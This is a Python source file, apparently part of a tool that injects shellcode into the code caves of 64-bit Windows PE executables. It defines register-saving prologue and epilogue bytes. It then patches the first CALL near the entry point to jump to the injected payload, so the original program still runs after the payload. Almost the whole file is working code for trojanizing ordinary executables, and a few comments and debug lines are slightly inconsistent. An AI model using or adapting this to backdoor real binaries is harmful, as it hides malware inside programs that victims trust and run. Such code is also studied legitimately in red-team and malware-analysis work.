import struct
from typing import Dict, List, Tuple, Optional, Union
from utils.logger import *


def generate_prologue() -> bytes:
    """Generate stack-aligned prologue for shellcode"""
    return (
        # Save the current stack pointer (rsp)
        b"\x48\x89\xe0"  # mov rax, rsp
        b"\x50"  # push rax (original rsp)

        # Save flags and registers
        b"\x9C"  # pushfq (save flags)
        b"\x51"  # push rcx
        b"\x52"  # push rdx
        b"\x53"  # push rbx
        b"\x55"  # push rbp
        b"\x56"  # push rsi
        b"\x57"  # push rdi
        b"\x41\x50"  # push r8
        b"\x41\x51"  # push r9
        b"\x41\x52"  # push r10
        b"\x41\x53"  # push r11
        b"\x41\x54"  # push r12
        b"\x41\x55"  # push r13
        b"\x41\x56"  # push r14
        b"\x41\x57"  # push r15

        # Total bytes pushed so far = 8 (RSP) + 8 (flags) + 15 * 8 (registers) = 136 bytes
        # Since 136 is not a multiple of 16, we need to align the stack

        # Align the stack to 16 bytes (adjustment)
        b"\x48\x83\xec\x08"  # sub rsp, 8; Align rsp to 16 bytes (total now 144 bytes, which is a multiple of 16)
    )


def generate_epilogue() -> bytes:
    """Generate stack-restoring epilogue for shellcode"""
    return (
        # Restore stack alignment (remove extra alignment adjustment)
        b"\x48\x83\xc4\x08"  # add rsp, 8  Undo the alignment adjustment (8 bytes)

        # Restore registers in reverse order
        b"\x41\x5F"  # pop r15
        b"\x41\x5E"  # pop r14
        b"\x41\x5D"  # pop r13
        b"\x41\x5C"  # pop r12
        b"\x41\x5B"  # pop r11
        b"\x41\x5A"  # pop r10
        b"\x41\x59"  # pop r9
        b"\x41\x58"  # pop r8
        b"\x5F"  # pop rdi
        b"\x5E"  # pop rsi
        b"\x5D"  # pop rbp
        b"\x5B"  # pop rbx
        b"\x5A"  # pop rdx
        b"\x59"  # pop rcx
        b"\x9D"  # popfq (restore flags)
        b"\x58"  # pop rax (Pop original rsp value)
        b"\x48\x89\xe4"  # mov rsp, rax (Restore rsp)

    )


def create_jump_to_cave(from_addr: int, to_addr: int) -> bytes:
    """Create a JMP instruction to the code cave"""
    jump_distance = to_addr - (from_addr + 5)  # 5 is size of JMP instruction
    return b'\xE9' + struct.pack('<i', jump_distance)


class ShellcodeInjector:
    def __init__(self, pe_parser, code_caver):
        self.pe_parser = pe_parser
        self.code_caver = code_caver
        self.pe = pe_parser.pe

    def find_entry_point_section(self):
        """Find the section containing the entry point"""
        entry_rva = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
        for section in self.pe.sections:
            if section.VirtualAddress <= entry_rva < section.VirtualAddress + section.Misc_VirtualSize:
                return section
        return None

    def inject_shellcode(self, shellcode: bytes) -> Dict[str, Union[int, str, bytes]]:
        """Inject shellcode with proper stack alignment and state preservation"""
        print_header("SHELLCODE INJECTION PROCESS")

        if self.pe.FILE_HEADER.Machine != 0x8664:
            raise ValueError("This injection method is only for 64-bit PE files")

        # Prepare shellcode with state preservation
        protected_shellcode = generate_prologue() + shellcode + generate_epilogue()

        # Find suitable code cave
        caves = self.code_caver.find_code_caves(min_size=len(protected_shellcode) + 16)  # Extra space for jumps
        best_cave, best_section, section_name = self.code_caver.find_best_cave(caves, len(protected_shellcode) + 16)

        if not best_cave:
            raise ValueError("No suitable code cave found for shellcode")

        cave_addr, cave_size = best_cave
        print_debug(f"Found code cave at {hex(cave_addr)} with size {cave_size}")

        # Find entry point section
        entry_section = self.find_entry_point_section()
        if not entry_section:
            raise ValueError("Could not find entry point section")

        entry_point = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
        print_debug(f"Original entry point: {hex(entry_point)}")
        call_func_to_overwrite = self.pe_parser.find_first_instruction("call", section_name, entry_point)
        jmp_func_to_overwrite = self.pe_parser.find_first_instruction("jmp", section_name, entry_point)

        # Calculate addresses
        cave_rva = best_cave[0] - best_section.VirtualAddress
        print(f"[DEBUG] Cave RVA: 0x{cave_rva:08x}")

        # Create JMP instruction to our cave
        jump_distance = best_cave[0] - (call_func_to_overwrite['address'] + 5)
        # print(f"[DEBUG] Jump distance: 0x{jump_distance:08x}")
        jmp_code = b'\xE9' + struct.pack('<I', jump_distance)

        # Calculate the relative offset for the CALL instruction

        call_target = best_cave[0] + len(protected_shellcode)
        target_address = self.pe_parser.extract_offset_and_calculate_target(call_func_to_overwrite['bytes'], call_func_to_overwrite['address'])
        

        # Calculate the relative offset for the call instruction from call_target to target_address
        # The offset should be: target_address - (call_target + length_of_CALL_instruction)
        next_instruction_address = call_target + 5  # Length of the CALL instruction is 5 bytes
        call_distance = target_address - next_instruction_address

        print(f"[DEBUG] call_distance: 0x{call_distance:08x}")
        print(f"[DEBUG] call_target: 0x{call_target:08x}")

        # Create the CALL instruction
        call_instruction = b'\xE8' + struct.pack('<i', call_distance)
        protected_shellcode += call_instruction

        # Prepare return jump to original entry
        jmp_target = best_cave[0] + len(protected_shellcode)
        target_address = self.pe_parser.extract_offset_and_calculate_target(jmp_func_to_overwrite['bytes'], jmp_func_to_overwrite['address'])
        # target_address = 0x000014c0

        next_instruction_address = jmp_target + 5  # Length of the CALL instruction is 5 bytes
        jmp_distance = target_address - next_instruction_address

        print(f"[DEBUG] call_distance: 0x{call_distance:08x}")
        print(f"[DEBUG] call_target: 0x{call_target:08x}")

        # Create the CALL instruction
        return_jmp = b'\xE9' + struct.pack('<i', jmp_distance)
        protected_shellcode += return_jmp

        # Append the CALL instruction to the shellcode
        final_code = protected_shellcode

        try:
            # Write shellcode to cave
            self.pe_parser.write_bytes(best_cave[0], final_code)

            # overwrite CALL function to JMP at entry point
            entry_raw = self.pe_parser.rva_to_raw(call_func_to_overwrite['address'], best_section.Name.decode().rstrip('\x00'))
            self.pe_parser.write_bytes(entry_raw, jmp_code)

            return {
                'status': 'success',
                'cave_address': hex(best_cave[0]),
                'cave_size': best_cave[1],
                'section': best_section.Name.decode().rstrip('\x00'),
                'original_entry_section': best_section.Name.decode().rstrip('\x00'),
                'shellcode_size': len(protected_shellcode)
            }

        except Exception as e:
            raise RuntimeError(f"Failed to inject shellcode: {str(e)}")


